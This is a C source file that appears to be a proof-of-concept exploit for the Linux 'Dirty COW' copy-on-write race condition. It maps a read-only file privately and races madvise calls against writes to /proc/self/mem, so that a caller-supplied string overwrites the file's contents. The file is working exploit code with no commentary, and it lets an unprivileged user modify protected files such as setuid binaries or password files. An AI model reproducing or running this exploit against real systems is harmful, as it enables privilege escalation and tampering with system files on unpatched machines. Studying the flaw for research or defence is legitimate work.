#include<stdio.h>
#include<stdint.h>
#include<string.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include<pthread.h>
#include<sys/mman.h>
#include<sys/stat.h>

void * map;
struct stat st;
int fd;
pthread_t madpid,writepid;
char * str;
int str_size;

void *madvisethread(void *arg){
	int c=0;
	for(int i=0; i < 1000000; i++){
		c += madvise(map, 100, MADV_DONTNEED);
	}
	printf("madvise %d\n", c);
}
void *writethread(void *arg){
	int c=0;
	int mem = open("/proc/self/mem", O_RDWR);
	for(int i=0; i < 1000000; i++){
		lseek(mem, (uintptr_t) map, SEEK_SET);
		c += write(mem,str,str_size);
	}
	printf("write %d\n", c);
}

int main(int argc, char* argv[]){
	if(argc <3){
		printf("usage: %s filename string\n",argv[0]);
		exit(-1);
	}
	str = argv[2];
	str_size = strlen(str);
	printf("file : %s\n", argv[1]);
	printf("string : %s\n", str);
	printf("string_size : %d\n", str_size);
	fd = open(argv[1], O_RDONLY);
	if(fd <= 0){
		printf("open failed!\n");
		exit(-1);
	}
	fstat(fd,&st);

	map = mmap(0, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	printf("map: %zx\n", (uintptr_t) map);
	if(map == 0){
		printf("mmap failed!\n");
		exit(-1);
	}
	printf("start racing....\n");

	pthread_create(&madpid, NULL, madvisethread, argv[1]);
	pthread_create(&writepid, NULL, writethread, argv[2]);
	pthread_join(madpid,NULL);
	pthread_join(writepid,NULL);
	return 0;
}
